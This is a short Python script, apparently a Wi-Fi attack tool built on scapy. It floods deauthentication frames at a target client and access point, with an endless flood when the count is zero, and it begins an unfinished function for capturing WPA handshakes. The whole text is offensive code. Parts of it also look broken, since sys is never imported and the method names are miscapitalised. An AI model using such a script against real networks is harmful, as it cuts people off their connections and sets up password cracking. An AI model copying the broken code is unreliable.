from scapy import *
from scapy.layers.dot11 import *

count = sys.argv[1] #Amount of DeAuth's to send
targetMAC = sys.argv[2] #Target MAC Address
APMAC = sys.argv[3] #Access Point MAC Address
iface = sys.argv[4]

#Constructing DeAuth message
deauth = RadioTap()/Dot11(
            type=0, subtype=12, addr1=targetMAC, addr2=APMAC, addr3=APMAC)/Dot11Deauth(
                reason=4)


for i in range(int(count)):
    sendp(deauth, iface=iface)

if int(count)==0:
    while True:
        sendp(deauth, iface=iface)

def getHandshake(pkt):
    #We check if the packet is a WPA packet
    if pkt.hasLayer(WPA_KEY):
        #Get the layer with the WPA information
        layer = pkt.getLayer(WPA_KEY)
